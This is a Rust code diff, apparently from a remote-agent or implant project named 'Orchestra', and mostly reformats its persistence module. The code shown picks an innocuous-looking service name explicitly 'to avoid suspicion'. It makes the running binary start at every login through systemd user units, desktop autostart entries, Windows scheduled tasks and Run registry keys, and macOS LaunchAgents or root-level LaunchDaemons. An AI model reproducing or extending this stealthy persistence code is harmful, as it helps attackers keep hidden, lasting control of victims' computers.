@@ -24,17 +24,17 @@ use winreg::RegKey;
 fn get_service_name() -> &'static str {
     // A small, static selection to avoid suspicion.
     let potential_names = ["UserSessionHelper", "ConfigSync", "DisplayCache"];
-    
+
     // Deterministic selection based on the hostname.
     let hostname = std::env::var("HOSTNAME")
         .or_else(|_| std::env::var("COMPUTERNAME"))
         .unwrap_or_else(|_| "localhost".to_string());
-        
+
     let mut sum: usize = 0;
     for b in hostname.bytes() {
         sum = sum.wrapping_add(b as usize);
     }
-    
+
     potential_names[sum % potential_names.len()]
 }
 
@@ -55,17 +55,23 @@ fn config_root() -> PathBuf {
 
 #[cfg(target_os = "linux")]
 fn unit_path() -> PathBuf {
-    config_root().join("systemd/user").join(format!("{}.service", get_service_name()))
+    config_root()
+        .join("systemd/user")
+        .join(format!("{}.service", get_service_name()))
 }
 
 #[cfg(target_os = "linux")]
 fn autostart_path() -> PathBuf {
-    config_root().join("autostart").join(format!("{}.desktop", get_service_name()))
+    config_root()
+        .join("autostart")
+        .join(format!("{}.desktop", get_service_name()))
 }
 
 #[cfg(target_os = "windows")]
 fn task_marker_path() -> PathBuf {
-    config_root().join(get_service_name()).join("persistence.marker")
+    config_root()
+        .join(get_service_name())
+        .join("persistence.marker")
 }
 
 /// Install the persistence entry. Returns the absolute path that was created
@@ -141,7 +147,7 @@ fn install_desktop_autostart() -> Result<PathBuf> {
         .context("Failed to get current executable path")?
         .display()
         .to_string();
-    
+
     let service_name = get_service_name();
     let desktop_entry = format!(
         "[Desktop Entry]\n\
@@ -165,7 +171,11 @@ fn uninstall_persistence_inner() -> Result<()> {
     if systemd_path.exists() {
         if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
             let _ = std::process::Command::new("systemctl")
-                .args(["--user", "disable", &format!("{}.service", get_service_name())])
+                .args([
+                    "--user",
+                    "disable",
+                    &format!("{}.service", get_service_name()),
+                ])
                 .status();
         }
         std::fs::remove_file(&systemd_path)
@@ -208,14 +218,7 @@ fn install_scheduled_task() -> Result<PathBuf> {
     if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
         let status = std::process::Command::new("schtasks")
             .args([
-                "/Create",
-                "/F",
-                "/SC",
-                "ONLOGON",
-                "/TN",
-                task_name,
-                "/TR",
-                &exe_path,
+                "/Create", "/F", "/SC", "ONLOGON", "/TN", task_name, "/TR", &exe_path,
             ])
             .status()
             .context("Failed to invoke schtasks")?;
@@ -231,7 +234,7 @@ fn install_scheduled_task() -> Result<PathBuf> {
 #[cfg(target_os = "windows")]
 fn install_run_key() -> Result<PathBuf> {
     let marker = task_marker_path();
-     if let Some(parent) = marker.parent() {
+    if let Some(parent) = marker.parent() {
         std::fs::create_dir_all(parent)?;
     }
 
@@ -239,7 +242,7 @@ fn install_run_key() -> Result<PathBuf> {
         .context("Failed to get current executable path")?
         .display()
         .to_string();
-    
+
     let key_name = get_service_name();
 
     if std::env::var("ORCHESTRA_PERSISTENCE_ROOT").is_err() {
@@ -250,7 +253,7 @@ fn install_run_key() -> Result<PathBuf> {
         )?;
         run_key.set_value(key_name, &exe_path)?;
     }
-    
+
     // Store the method and name for uninstallation.
     std::fs::write(&marker, format!("runkey\n{key_name}"))?;
     Ok(marker)
@@ -292,7 +295,6 @@ fn uninstall_persistence_inner() -> Result<()> {
     Ok(())
 }
 
-
 #[cfg(target_os = "macos")]
 fn plist_path(system_level: bool) -> PathBuf {
     if let Ok(p) = std::env::var("ORCHESTRA_PERSISTENCE_ROOT") {
@@ -301,7 +303,10 @@ fn plist_path(system_level: bool) -> PathBuf {
     if system_level {
         PathBuf::from("/Library/LaunchDaemons").join(format!("{}.plist", get_service_name()))
     } else if let Some(dir) = directories::BaseDirs::new() {
-        dir.home_dir().join("Library").join("LaunchAgents").join(format!("{}.plist", get_service_name()))
+        dir.home_dir()
+            .join("Library")
+            .join("LaunchAgents")
+            .join(format!("{}.plist", get_service_name()))
     } else {
         // Fallback for user path
         PathBuf::from(format!("{}.plist", get_service_name()))
@@ -319,8 +324,12 @@ fn install_persistence_inner() -> Result<PathBuf> {
     let system_level = is_root();
     let path = plist_path(system_level);
     if let Some(parent) = path.parent() {
-        std::fs::create_dir_all(parent)
-            .with_context(|| format!("Failed to create Launch agents/daemons directory {}", parent.display()))?;
+        std::fs::create_dir_all(parent).with_context(|| {
+            format!(
+                "Failed to create Launch agents/daemons directory {}",
+                parent.display()
+            )
+        })?;
     }
 
     let exe_path = std::env::current_exe()
@@ -357,12 +366,8 @@ fn install_persistence_inner() -> Result<PathBuf> {
         let (target, target_path) = if system_level {
             ("system".to_string(), path.to_string_lossy().to_string())
         } else {
-            let uid_out = std::process::Command::new("id")
-                .arg("-u")
-                .output()
-                .context("Failed to get UID for launchctl bootstrap")?;
-            let uid = String::from_utf8_lossy(&uid_out.stdout).trim().to_string();
-            (format!("gui/{uid}"), path.to_string_lossy().to_string())
+            let uid = unsafe { libc::getuid() };
+            (format!("gui/{}", uid), path.to_string_lossy().to_string())
         };
 
         let status = std::process::Command::new("launchctl")
@@ -379,7 +384,7 @@ fn install_persistence_inner() -> Result<PathBuf> {
 fn uninstall_persistence_inner() -> Result<()> {
     let system_level = is_root();
     let path = plist_path(system_level);
-    
+
     if !path.exists() && system_level {
         // We are root, but system level didn't exist, try user fallback in uninstall
         let upath = plist_path(false);
@@ -387,7 +392,7 @@ fn uninstall_persistence_inner() -> Result<()> {
             return uninstall_persistence_actual(upath, false);
         }
     }
-    
+
     uninstall_persistence_actual(path, system_level)
 }
 
